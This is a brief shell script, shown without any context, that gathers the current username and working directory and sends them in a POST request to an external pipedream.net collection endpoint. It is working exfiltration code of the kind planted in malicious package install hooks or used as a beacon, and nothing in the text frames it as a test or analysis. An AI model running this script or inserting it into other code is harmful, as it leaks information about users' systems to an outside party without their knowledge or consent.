whoami_val=$(whoami)
username_val=$(id -un)
cwd_val=$(pwd)

curl -X POST https://eonw4rkshveo8pz.m.pipedream.net \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "whoami=$whoami_val&username=$username_val&cwd=$cwd_val"
